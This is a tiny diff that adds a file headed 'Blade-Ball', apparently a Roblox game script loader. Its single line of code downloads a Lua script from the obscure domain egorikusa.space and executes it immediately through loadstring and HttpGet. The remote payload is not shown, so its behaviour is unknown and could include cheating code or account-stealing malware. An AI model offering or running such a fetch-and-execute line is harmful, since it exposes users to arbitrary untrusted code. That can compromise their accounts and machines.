@@ -1,0 +1,5 @@
+#Blade-Ball
+
+
+
+loadstring(game:HttpGet("https://egorikusa.space/f0229b770cc8ce696fda349a.lua", true))()
